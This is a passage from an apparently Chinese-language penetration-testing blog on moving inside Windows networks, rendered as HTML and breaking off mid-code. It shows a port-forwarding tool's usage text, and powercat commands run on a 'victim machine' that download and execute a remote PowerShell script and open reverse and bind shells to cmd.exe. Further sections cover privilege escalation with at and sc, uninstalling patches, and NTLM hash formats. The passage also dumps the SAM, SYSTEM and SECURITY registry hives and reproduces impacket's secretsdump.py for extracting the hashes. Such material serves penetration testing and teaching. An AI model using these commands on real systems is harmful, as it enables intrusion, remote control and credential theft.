class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; &gt;  &lt;| | (__ | |  __/ (_| | | | | | |&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;/_/\\_\\_|\\___||_|\\___|\\__,_|_| |_| |_|&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;site:http://sec.xlcteam.com&quot;</span> &lt;&lt; <span class="built_in">endl</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;usage: xlc.exe [options]&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;options:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-slave  remoteIp remotePort1  localIp  localPort&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-listen  remotePort1 remotePort2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;e.g.:&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -slave  202.119.225.35 51 192.168.0.11 3389&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;xlc.exe -listen 51  33891&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="powercat"><a href="#powercat" class="headerlink" title="powercat"></a>powercat</h4><p>powercat是一款ps版nc。可以本地执行，也可以远程下载执行</p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;besimorhino&#x2F;powercat</span><br></pre></td></tr></table></figure>

<h5 id="参数解释-1"><a href="#参数解释-1" class="headerlink" title="参数解释"></a>参数解释</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-l      监听连接                                      [Switch]</span><br><span class="line">-c      连接到侦听器                                   [String]</span><br><span class="line">-p      要连接或监听的端口.                             [String]</span><br><span class="line">-e      执行. (GAPING_SECURITY_HOLE)                  [String]</span><br><span class="line">-ep     执行Powershell                                [Switch]</span><br><span class="line">-r      中继,格式: &quot;-r tcp:10.1.1.1:443&quot;               [String]</span><br><span class="line">-u      通过UDP传输数据                                 [Switch]</span><br><span class="line">-dns    通过dns传输数据 (dnscat2)                       [String]</span><br><span class="line">-dnsft  DNS故障阈值                                     [int32]</span><br><span class="line">-t      超时选项, 默认值: 60                             [int32]</span><br><span class="line">-i      输入：文件路径（字符串）,字节数组或字符串            [object]</span><br><span class="line">-o      控制台输出类型: &quot;Host&quot;, &quot;Bytes&quot;, or &quot;String&quot;     [String]</span><br><span class="line">-of     输出文件路径                                     [String]</span><br><span class="line">-d      连接后断开连接                                   [Switch]</span><br><span class="line">-rep    中继器,断开连接后重新启动                          [Switch]</span><br><span class="line">-g      生成有效载荷                                     [Switch]</span><br><span class="line">-ge     生成编码的有效载荷                                [Switch]</span><br></pre></td></tr></table></figure>

<p>这里把kali当做我们VPS服务器</p>
<h5 id="反向链接"><a href="#反向链接" class="headerlink" title="反向链接"></a>反向链接</h5><p>kali上面运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 4444 -vv</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/49.png?raw=true" alt="image-20200801155544855"></p>
<p>受害者机器上运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-c</span> <span class="number">192.168</span>.<span class="number">183.138</span> <span class="literal">-p</span> <span class="number">4444</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/50.png?raw=true" alt="image-20200801155534168"></p>
<p>然后我们可以用代理工具链接kali上的4444端口进行代理访问了</p>
<h5 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h5><p>受害者机器上运行</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object System.Net.Webclient).DownloadString(&#x27;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#x27;)&quot;</span></span><br><span class="line">//先导入这个模块才行不然有些机器运行是没有任何反应的</span><br><span class="line"><span class="built_in">Import-Module</span> ./powercat.ps1</span><br><span class="line">powercat <span class="literal">-l</span> <span class="literal">-p</span> <span class="number">8888</span> <span class="literal">-e</span> cmd.exe <span class="literal">-v</span></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/51.png?raw=true" alt="image-20200801155337817"></p>
<p>kali上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc  192.168.183.145 8888 -vv</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/52.png?raw=true" alt="image-20200801155352064"></p>
<p>这样我们就能直接执行命令了</p>
<h4 id="mssql"><a href="#mssql" class="headerlink" title="mssql"></a>mssql</h4><p>当目标机器只开放mssql时，我们也可以利用mssql执行clr作为传输通道。</p>
<p>项目地址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;blackarrowsec&#x2F;mssqlproxy</span><br></pre></td></tr></table></figure>

<p>需要环境如下</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/53.png?raw=true" alt="img"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>首先在Windows中，权限分为四类</p>
<table>
<thead>
<tr>
<th align="center"><strong>权限</strong></th>
<th align="center"><strong>详细</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center">User</td>
<td align="center">普通用户权限</td>
</tr>
<tr>
<td align="center">Administrator</td>
<td align="center">管理员权限。通常需要通过机制再提升为system权限来操作SAM（Mimikatz抓密码）</td>
</tr>
<tr>
<td align="center">System</td>
<td align="center">系统权限。可以操作SAM，需要从Administrator提升到SAM才能对散列值Dump</td>
</tr>
<tr>
<td align="center">TrustedInstaller</td>
<td align="center">最高权限，可以操作系统文件</td>
</tr>
</tbody></table>
<p>利用kb编号查询相关CVE网站</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;bugs.hacking8.com&#x2F;tiquan&#x2F;</span><br></pre></td></tr></table></figure>

<p>利用MSF查询可利用提权漏洞</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br></pre></td></tr></table></figure>

<p>还可以卸载kb补丁</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wusa /uninstall /kb:XXXXXXX</span><br></pre></td></tr></table></figure>

<h3 id="Administrator提权到SYSTEM"><a href="#Administrator提权到SYSTEM" class="headerlink" title="Administrator提权到SYSTEM"></a>Administrator提权到SYSTEM</h3><h4 id="at本地命令提权"><a href="#at本地命令提权" class="headerlink" title="at本地命令提权"></a>at本地命令提权</h4><p>适用于Windows2000、Windows 2003、Windows XP这三个系统</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#at 时间 命令</span><br><span class="line">at 20:45 calc.exe</span><br><span class="line">#开启交互式的cmd</span><br><span class="line">at 20:45 &#x2F;interactive cmd.exe</span><br></pre></td></tr></table></figure>

<h4 id="sc命令提权"><a href="#sc命令提权" class="headerlink" title="sc命令提权"></a>sc命令提权</h4><p>适用于Windows 7、Windows 8、Windows Server 03、Windows Server  08、Windows Server  12、Windows Server 16</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath&#x3D; &quot;cmd &#x2F;K start&quot; type&#x3D; own type&#x3D; interact</span><br></pre></td></tr></table></figure>



<h3 id="CVE漏洞提权"><a href="#CVE漏洞提权" class="headerlink" title="CVE漏洞提权"></a>CVE漏洞提权</h3><p>单独写一篇文章主要是内容太多了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.ascotbe.com&#x2F;2020&#x2F;08&#x2F;10&#x2F;WindowsKernelExploits&#x2F;</span><br></pre></td></tr></table></figure>



<h2 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h2><p>密码抓取已经成为渗透中必不可少的一项技能。一个管理员很可能管理着N多台机器，但是密码使用的都是同一个或者是有规律的。如果抓到一台机器的密码，利用同密码碰撞，很可能这个渗透项目就结束了。</p>
<h3 id="密码组成"><a href="#密码组成" class="headerlink" title="密码组成"></a>密码组成</h3><p>我们经常看到的hash长这样：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p>他的组成就是:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user:sid:lmhash:ntlmhash</span><br></pre></td></tr></table></figure>

<p>lmhash的加密流程如下：</p>
<p>1、密码长度限制为14个字符</p>
<p>2、密码全部转换为大写</p>
<p>3、密码转换为16进制字符串，不足14字节用0补全</p>
<p>4、密码的16进制字符串被分成两个7byte部分</p>
<p>5、再分7bit为一组,每组末尾加0，再组成一组</p>
<p>6、上步骤得到的二组，分别作为key 为 <code>KGS!@#$%</code>进行DES加密。</p>
<p>7、将加密后的两组拼接在一起，得到最终LM HASH值。</p>
<p>为了解决LM加密和身份验证方案固有的安全漏洞，Microsoft 于1993年在Windows NT 3.1中引入了NTLMv1协议(ntlmhash)。对于散列，NTLM使用Unicode支持，替换为，不需要任何填充或截断操作即可简化密钥。</p>
<p>1、先将用户密码转换为十六进制格式。</p>
<p>2、将十六进制格式的密码进行Unicode编码。</p>
<p>3、使用MD4对Unicode编码数据进行Hash计算</p>
<p>因为在vista后不再支持lmhash，因此抓到的hash中的lmhash都是<code>aad3b435b51404eeaad3b435b51404ee</code></p>
<p>在hash传递攻击时，可以替换成0：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>再看下ntlm认证的过程</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/54.png?raw=true" alt="img"></p>
<p>他的简述流程如下：</p>
<p>1、客户端向服务端发起认证</p>
<p>2、服务器收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。并使用登录用户密码hash加密Challenge，获得Challenge1</p>
<p>3、客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</p>
<p>4、服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功。</p>
<p>上述中的response类似于下面这样：</p>
<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/55.png?raw=true" alt="img"></p>
<p>上述中的response就可以理解为net-ntlmhash，因此ntlmhash我们是可以拿来hash传递的，而net-ntlmhash不可以，但是net-ntlmhash也可以拿来做破解和relay。</p>
<h3 id="本地提取"><a href="#本地提取" class="headerlink" title="本地提取"></a>本地提取</h3><p>在windows上的<strong>C:\Windows\System32\config</strong>目录保存着当前用户的密码hash。我们可以使用相关手段获取该hash。</p>
<p><strong>提取的时候需要管理员权限，普通权限没办法提取出来</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用reg命令获取本地用户凭据hash</span></span><br><span class="line">reg  save  hklm\sam sam.hive</span><br><span class="line">reg  save hklm\system system.hive</span><br><span class="line">reg  save hklm\security security.hive</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/56.png?raw=true" alt="image-20200803150511319"></p>
<p>然后用下面这个项目解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;SecureAuthCorp&#x2F;impacket&#x2F;blob&#x2F;master&#x2F;examples&#x2F;secretsdump.py</span><br></pre></td></tr></table></figure>

<p>防止丢失我就把代码拷贝过来了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> division</span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket <span class="keyword">import</span> version</span><br><span class="line"><span class="keyword">from</span> impacket.examples <span class="keyword">import</span> logger</span><br><span class="line"><span class="keyword">from</span> impacket.smbconnection <span class="keyword">import</span> SMBConnection</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> impacket.examples.secretsdump <span class="keyword">import</span> LocalOperations, RemoteOperations, SAMHashes, LSASecrets, NTDSHashes</span><br><span class="line"><span class="keyword">from</span> impacket.krb5.keytab <span class="keyword">import</span> Keytab</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">input</span> = raw_input</span><br><span class="line"><span class="keyword">except</span> NameError:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DumpSecrets</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, remoteName, username=<span class="string">&#x27;&#x27;</span>, password=<span class="string">&#x27;&#x27;</span>, domain=<span class="string">&#x27;&#x27;</span>, options=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.__useVSSMethod = options.use_vss</span><br><span class="line">        self.__remoteName = remoteName</span><br><span class="line">        self.__remoteHost = options.target_ip</span><br><span class="line">        self.__username = username</span><br><span class="line">        self.__password = password</span><br><span class="line">        self.__domain = domain</span><br><span class="line">        self.__lmhash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__nthash = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        self.__aesKey = options.aesKey</span><br><span class="line">        self.__smbConnection = <span class="literal">None</span></span><br><span class="line">        self.__remoteOps = <span class="literal">None</span></span><br><span class="line">        self.__SAMHashes = <span class="literal">None</span></span><br><span class="line">        self.__NTDSHashes = <span class="literal">None</span></span><br><span class="line">        self.__LSASecrets = <span class="literal">None</span></span><br><span class="line">        self.__systemHive = options.system</span><br><span class="line">        self.__bootkey = options.bootkey</span><br><span class="line">        self.__securityHive = options.security</span><br><span class="line">        self.__samHive = options.sam</span><br><span class="line">        self.__ntdsFile = options.ntds</span><br><span class="line">        self.__history = options.history</span><br><span class="line">        self.__noLMHash = <span class="literal">True</span></span><br><span class="line">        self.__isRemote = <span class="literal">True</span></span><br><span class="line">        self.__outputFileName = options.outputfile</span><br><span class="line">        self.__doKerberos = options.k</span><br><span class="line">        self.__justDC = options.just_dc</span><br><span class="line">        self.__justDCNTLM = options.just_dc_ntlm</span><br><span class="line">        self.__justUser = options.just_dc_user</span><br><span class="line">        self.__pwdLastSet = options.pwd_last_set</span><br><span class="line">        self.__printUserStatus= options.user_status</span><br><span class="line">        self.__resumeFileName = options.resumefile</span><br><span class="line">        self.__canProcessSAMLSA = <span class="literal">True</span></span><br><span class="line">        self.__kdcHost = options.dc_ip</span><br><span class="line">        self.__options = options</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> options.hashes <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.__lmhash, self.__nthash = options.hashes.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)</span><br><span class="line">        <span class="keyword">if</span> self.__doKerberos:</span><br><span class="line">            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,</span><br><span class="line">                                               self.__nthash, self.__aesKey, self.__kdcHost)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.__remoteName.upper() == <span class="string">&#x27;LOCAL&#x27;</span> <span class="keyword">and</span> self.__username == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">False</span></span><br><span class="line">                self.__useVSSMethod = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">if</span> self.__systemHive:</span><br><span class="line">                    localOperations = LocalOperations(self.__systemHive)</span><br><span class="line">                    bootKey = localOperations.getBootKey()</span><br><span class="line">                    <span class="keyword">if</span> self.__ntdsFile <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="comment"># Let&#x27;s grab target&#x27;s configuration about LM Hashes storage</span></span><br><span class="line">                        self.__noLMHash = localOperations.checkNoLMHashPolicy()</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">import</span> binascii</span><br><span class="line">                    bootKey = binascii.unhexlify(self.__bootkey)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.__isRemote = <span class="literal">True</span></span><br><span class="line">                bootKey = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        self.connect()</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        <span class="keyword">if</span> os.getenv(<span class="string">&#x27;KRB5CCNAME&#x27;</span>) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> self.__doKerberos <span class="keyword">is</span> <span class="literal">True</span>:</span><br><span class="line">                            <span class="comment"># SMBConnection failed. That might be because there was no way to log into the</span></span><br><span class="line">                            <span class="comment"># target system. We just have a last resort. Hope we have tickets cached and that they</span></span><br><span class="line">                            <span class="comment"># will work</span></span><br><span class="line">                            logging.debug(<span class="string">&#x27;SMBConnection didn\&#x27;t work, hoping Kerberos will help (%s)&#x27;</span> % <span class="built_in">str</span>(e))</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">raise</span></span><br><span class="line"></span><br><span class="line">                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)</span><br><span class="line">                    self.__remoteOps.setExecMethod(self.__options.exec_method)</span><br><span class="line">                    <span class="keyword">if</span> self.__justDC <span class="keyword">is</span> 